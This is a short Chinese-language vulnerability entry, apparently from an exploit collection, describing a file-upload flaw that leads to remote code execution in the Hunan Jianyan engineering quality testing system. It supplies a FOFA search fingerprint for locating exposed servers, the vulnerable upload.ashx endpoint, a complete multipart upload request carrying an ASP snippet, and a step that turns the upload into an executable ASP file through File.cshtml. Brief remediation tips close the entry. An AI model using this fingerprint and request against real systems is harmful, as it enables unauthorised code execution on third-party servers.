# 湖南建研信息工程质量检测系统文件上传致RCE

- **系统**：湖南建研信息工程质量检测系统文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/Content/Theme/Standard/webSite/login.css"`
- **请求**：`POST /Applications/Attachment/upload.ashx HTTP/1.1`

**请求体 / payload**
```
1、fofa
body="/Content/Theme/Standard/webSite/login.css"
2、部分界面如下
3、隐患url，验证如下
Host: your-ip
Content-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4
--------------------------8ecd2b831e8d20f4
Content-Disposition: form-data; name="file"; filename="asd.txt"
<% Response.Write("Hello, World") %>
--------------------------8ecd2b831e8d20f4
Content-Disposition: form-data; name="_upload_guid"
asd
--------------------------8ecd2b831e8d20f4--
利用File.cshtml 接口将文件转换为asp文件
验证
```

**其他**
- 修复建议: 1、请联系厂商进行修复。
 2、如非必要，禁止公网访问该系统。
 3、设置白名单访问。